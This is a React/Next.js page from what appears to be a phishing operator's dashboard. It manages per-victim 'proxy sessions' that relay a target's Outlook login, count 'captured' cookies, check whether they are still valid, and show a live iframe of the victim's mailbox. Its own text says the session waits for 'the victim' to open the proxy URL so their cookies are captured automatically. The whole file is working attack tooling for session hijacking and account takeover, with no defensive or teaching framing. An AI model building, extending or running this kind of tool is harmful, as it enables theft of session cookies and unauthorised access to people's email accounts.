"use client";

import { useState, useEffect, useCallback } from "react";
import { useParams, useRouter } from "next/navigation";
import { Token } from "@/types/token";
import { fetchTokens, getProxySessionStatus, createProxySession, killProxySession, refreshProxySession } from "@/lib/api";
import { ArrowLeft, ExternalLink, RefreshCw, Shield, XCircle, Loader2, Globe, Clock, Cookie } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";

export default function ProxySessionPage() {
  const params = useParams<{ tokenId: string }>();
  const tokenId = params?.tokenId;
  const router = useRouter();

  const [token, setToken] = useState<Token | null>(null);
  const [loading, setLoading] = useState(true);
  const [sessionStatus, setSessionStatus] = useState<any>(null);
  const [statusLoading, setStatusLoading] = useState(false);
  const [creating, setCreating] = useState(false);
  const [killing, setKilling] = useState(false);
  const [refreshing, setRefreshing] = useState(false);

  const loadToken = useCallback(async () => {
    if (!tokenId) return;
    setLoading(true);
    try {
      const data = await fetchTokens();
      const found = data?.find((t: Token) => t.id === tokenId) || null;
      setToken(found);
    } catch (err: any) {
      toast.error("Failed to load token", { description: err.message });
    } finally {
      setLoading(false);
    }
  }, [tokenId]);

  const loadSessionStatus = useCallback(async () => {
    if (!tokenId) return;
    setStatusLoading(true);
    try {
      const status = await getProxySessionStatus(tokenId);
      setSessionStatus(status);
    } catch (err: any) {
      console.log("Session status not available yet", err.message);
    } finally {
      setStatusLoading(false);
    }
  }, [tokenId]);

  const handleCreate = async () => {
    if (!tokenId) return;
    setCreating(true);
    try {
      const result = await createProxySession(tokenId);
      toast.success("Browser session created", { description: result.proxy_url });
      setSessionStatus({
        token_id: tokenId,
        status: "pending",
        proxy_url: result.proxy_url,
        created_at: result.created_at,
        cookie_count: 0,
        is_valid: false,
      });
    } catch (err: any) {
      toast.error("Failed to create session", { description: err.message });
    } finally {
      setCreating(false);
    }
  };

  const handleKill = async () => {
    if (!tokenId) return;
    if (!confirm("Kill this browser session? All cookies will be cleared.")) return;
    setKilling(true);
    try {
      await killProxySession(tokenId);
      toast.success("Browser session killed");
      setSessionStatus(null);
    } catch (err: any) {
      toast.error("Failed to kill session", { description: err.message });
    } finally {
      setKilling(false);
    }
  };

  const handleRefresh = async () => {
    if (!tokenId) return;
    setRefreshing(true);
    try {
      const result = await refreshProxySession(tokenId);
      if (result.session_valid) {
        toast.success("Session refreshed", { description: "Cookies are valid" });
      } else {
        toast.error("Session refresh failed", { description: "Cookies may be expired" });
      }
      await loadSessionStatus();
    } catch (err: any) {
      toast.error("Refresh failed", { description: err.message });
    } finally {
      setRefreshing(false);
    }
  };

  useEffect(() => {
    loadToken();
  }, [loadToken]);

  useEffect(() => {
    if (token) {
      loadSessionStatus();
    }
  }, [token, loadSessionStatus]);

  if (loading) {
    return (
      <div className="flex-1 flex items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin text-muted-foreground" />
      </div>
    );
  }

  if (!token) {
    return (
      <div className="flex-1 flex items-center justify-center">
        <div className="text-center space-y-4">
          <Shield className="h-8 w-8 mx-auto text-muted-foreground" />
          <p className="text-sm text-muted-foreground">Token not found</p>
          <Button variant="outline" size="sm" onClick={() => router.push("/")}>
            Return to Dashboard
          </Button>
        </div>
      </div>
    );
  }

  const status = sessionStatus?.status || "none";
  const isActive = status === "active";
  const isPending = status === "pending";
  const isExpired = status === "expired";
  const isKilled = status === "killed";

  return (
    <div className="flex-1 flex flex-col min-h-0">
      {/* Header */}
      <div className="sticky top-0 z-40 flex items-center gap-3 h-14 px-6 glass-strong border-b border-white/5">
        <button
          onClick={() => router.push("/")}
          className="flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground transition-colors"
        >
          <ArrowLeft className="h-4 w-4" />
          <span className="hidden sm:inline">Dashboard</span>
        </button>
        <div className="h-4 w-px bg-white/10" />
        <div className="min-w-0 flex-1">
          <h2 className="text-sm font-semibold tracking-tight text-foreground truncate">
            {token.email}
          </h2>
        </div>
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto p-6">
        <div className="max-w-4xl mx-auto space-y-6">
          {/* Title */}
          <div className="flex items-center gap-3">
            <div className="h-10 w-10 rounded-lg bg-violet-500/10 flex items-center justify-center">
              <Globe className="h-5 w-5 text-violet-400" />
            </div>
            <div>
              <h1 className="text-lg font-semibold text-foreground">Browser Session</h1>
              <p className="text-xs text-muted-foreground">
                Proxy session for {token.email}
              </p>
            </div>
          </div>

          {/* Status Card */}
          <div className="rounded-lg border border-white/5 bg-secondary/20 p-4 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-medium text-foreground">Session Status</h3>
              <Badge
                variant="outline"
                className={
                  isActive
                    ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
                    : isPending
                    ? "bg-amber-500/10 text-amber-400 border-amber-500/20"
                    : isExpired
                    ? "bg-rose-500/10 text-rose-400 border-rose-500/20"
                    : isKilled
                    ? "bg-gray-500/10 text-gray-400 border-gray-500/20"
                    : "bg-gray-500/10 text-gray-400 border-gray-500/20"
                }
              >
                {isActive ? "● Active" : isPending ? "◐ Pending" : isExpired ? "○ Expired" : isKilled ? "✕ Killed" : "○ None"}
              </Badge>
            </div>

            {sessionStatus && (
              <div className="space-y-2 text-sm">
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">Proxy URL:</span>
                  <a
                    href={sessionStatus.proxy_url}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-violet-400 hover:text-violet-300 flex items-center gap-1"
                  >
                    <ExternalLink className="h-3 w-3" />
                    Open
                  </a>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">Cookies:</span>
                  <span className="text-foreground">{sessionStatus.cookie_count || 0} captured</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">Valid:</span>
                  <span className={sessionStatus.is_valid ? "text-emerald-400" : "text-rose-400"}>
                    {sessionStatus.is_valid ? "Yes" : "No"}
                  </span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">Created:</span>
                  <span className="text-foreground">{sessionStatus.created_at || "Unknown"}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-muted-foreground">Next Refresh:</span>
                  <span className="text-foreground">{sessionStatus.next_refresh || "N/A"}</span>
                </div>
              </div>
            )}

            {/* Action Buttons */}
            <div className="flex items-center gap-2 pt-2">
              {!isActive && !isPending && (
                <Button size="sm" onClick={handleCreate} disabled={creating} className="gap-1.5">
                  {creating ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Globe className="h-3.5 w-3.5" />}
                  {creating ? "Creating..." : "Create Session"}
                </Button>
              )}
              {(isActive || isPending) && (
                <>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={handleRefresh}
                    disabled={refreshing}
                    className="gap-1.5"
                  >
                    <RefreshCw className={`h-3.5 w-3.5 ${refreshing ? "animate-spin" : ""}`} />
                    {refreshing ? "Refreshing..." : "Refresh"}
                  </Button>
                  <Button
                    size="sm"
                    variant="outline"
                    onClick={handleKill}
                    disabled={killing}
                    className="gap-1.5 border-rose-500/20 text-rose-400 hover:bg-rose-500/10"
                  >
                    <XCircle className="h-3.5 w-3.5" />
                    {killing ? "Killing..." : "Kill Session"}
                  </Button>
                </>
              )}
            </div>
          </div>

          {/* Proxy URL Display */}
          {(isActive || isPending) && sessionStatus?.proxy_url && (
            <div className="rounded-lg border border-white/5 bg-secondary/20 p-4">
              <h3 className="text-sm font-medium text-foreground mb-2">Proxy URL</h3>
              <div className="flex items-center gap-2">
                <code className="flex-1 bg-black/50 rounded px-3 py-2 text-xs text-violet-400 break-all">
                  {sessionStatus.proxy_url}
                </code>
                <Button
                  size="sm"
                  variant="outline"
                  onClick={() => {
                    navigator.clipboard.writeText(sessionStatus.proxy_url);
                    toast.success("URL copied to clipboard");
                  }}
                  className="shrink-0"
                >
                  Copy
                </Button>
                <Button
                  size="sm"
                  onClick={() => window.open(sessionStatus.proxy_url, "_blank")}
                  className="shrink-0 gap-1.5"
                >
                  <ExternalLink className="h-3.5 w-3.5" />
                  Open
                </Button>
              </div>
            </div>
          )}

          {/* Instructions */}
          {isPending && (
            <div className="rounded-lg border border-amber-500/20 bg-amber-500/10 p-4">
              <h3 className="text-sm font-medium text-amber-400 mb-2">Session Pending</h3>
              <p className="text-xs text-muted-foreground">
                The browser session is waiting for the victim to access the proxy URL. Once they visit the URL, cookies will be automatically captured.
              </p>
            </div>
          )}

          {isExpired && (
            <div className="rounded-lg border border-rose-500/20 bg-rose-500/10 p-4">
              <h3 className="text-sm font-medium text-rose-400 mb-2">Session Expired</h3>
              <p className="text-xs text-muted-foreground">
                The browser session has expired. The cookies are no longer valid. Create a new session to capture fresh cookies.
              </p>
            </div>
          )}

          {/* iFrame for Active Session */}
          {isActive && sessionStatus?.proxy_url && (
            <div className="rounded-lg border border-white/5 bg-secondary/20 p-4">
              <h3 className="text-sm font-medium text-foreground mb-2">Live Browser View</h3>
              <div className="aspect-video bg-black/50 rounded-lg overflow-hidden">
                <iframe
                  src={sessionStatus.proxy_url}
                  className="w-full h-full"
                  sandbox="allow-same-origin allow-scripts allow-forms"
                  title="Proxy Session"
                />
              </div>
              <p className="text-xs text-muted-foreground mt-2">
                This iframe loads the victim's Outlook through the proxy. Note: Some sites block iframe loading.
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
